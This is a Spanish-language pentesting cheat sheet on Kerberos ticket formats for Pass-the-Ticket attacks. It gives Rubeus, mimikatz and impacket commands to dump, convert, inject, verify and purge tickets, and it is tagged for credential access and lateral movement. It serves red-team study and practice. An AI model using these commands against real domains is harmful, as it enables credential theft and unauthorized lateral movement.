---
aliases:
  - Kerberos Ticket Formats
  - kirbi ccache
tags:
  - type/technique
  - technique/lateral-movement
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Pass-the-Ticket]]'
---
# Pass-the-Ticket - Formatos y Conversión

***

## .kirbi (Windows native)

| **Detalle** | **Valor** | **Nota** |
|:---:|:---:|:---:|
| Formato | Binario MIT-like | Nativo Windows Kerberos. |
| Extensión | `.kirbi` | Output de mimikatz export. |
| Usado por | Rubeus, mimikatz | Windows-centric. |
| Encoding alternativo | Base64 del .kirbi | Output default de Rubeus. |
| Convertir a ccache | `impacket-ticketConverter in.kirbi out.ccache` | Para usar en Linux. |
^ptt-fmt-kirbi

___

## .ccache (MIT / Linux)

| **Detalle** | **Valor** | **Nota** |
|:---:|:---:|:---:|
| Formato | MIT Kerberos credential cache | Nativo Linux/UNIX. |
| Location default | `/tmp/krb5cc_<UID>` | Set via `$KRB5CCNAME`. |
| Usado por | impacket, klist (Linux), kinit | Linux-centric. |
| Convertir a kirbi | `impacket-ticketConverter in.ccache out.kirbi` | Para inyectar en Windows. |
| Variable env | `export KRB5CCNAME=/path/ticket.ccache` | Activa el ccache. |
^ptt-fmt-ccache

___

## Base64 (Rubeus output)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe dump /nowrap` | Base64 sin wrap (usable directo) | Standard — sin `/nowrap` = multilínea. |
| `Rubeus.exe ptt /ticket:<BASE64>` | Inyectar desde base64 | Directo sin archivo. |
| `[Convert]::FromBase64String($b64) \| Set-Content ticket.kirbi -Encoding Byte` | Decodificar a .kirbi en PS | Pre-transfer. |
^ptt-fmt-base64

```powershell
# Decode base64 Rubeus output → .kirbi
$b64 = "doIFqjCCBaag..."
[Convert]::FromBase64String($b64) | Set-Content -Path .\ticket.kirbi -Encoding Byte
```

___

## ticketConverter (impacket)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketConverter ticket.kirbi ticket.ccache` | .kirbi → .ccache | Post-Windows dump, para impacket. |
| `impacket-ticketConverter ticket.ccache ticket.kirbi` | .ccache → .kirbi | Post-getST, para inyectar en Windows. |
^ptt-fmt-convert

```bash
# kirbi → ccache (Windows dump → Linux use)
impacket-ticketConverter administrator.kirbi administrator.ccache
export KRB5CCNAME=administrator.ccache

# ccache → kirbi (getST output → Windows inject)
impacket-ticketConverter administrator@cifs_target.ccache ticket.kirbi
```

___

## klist — verificar tickets

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` (Windows) | Lista tickets en sesión actual | Post-inject, verificar. |
| `klist` (Linux) | Lista tickets del ccache activo | Post `export KRB5CCNAME`. |
| `klist -e` (Linux) | Muestra encryption types | Verificar AES vs RC4. |
| `Rubeus.exe triage` | Lista todos los tickets del sistema (priv) | Pre-dump recon. |
^ptt-fmt-verify

```cmd
:: Windows post-inject
Rubeus.exe ptt /ticket:ticket.kirbi
klist
:: Debe mostrar: Kerberos tickets cached, server = krbtgt/...
```

```bash
# Linux post-export
export KRB5CCNAME=/tmp/administrator.ccache
klist
# Debe mostrar: Credentials cache: FILE:/tmp/administrator.ccache
```

___

## Purge tickets

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe purge` | Limpia tickets de sesión actual (Windows) | Post-operación, cleanup. |
| `klist purge` (Windows) | Alternativa nativa | Cleanup. |
| `kdestroy` (Linux) | Destruye ccache activo | Post-operación. |
| `Rubeus.exe purge /luid:<LUID>` | Purge sesión específica | Targeted cleanup. |
^ptt-fmt-purge

***
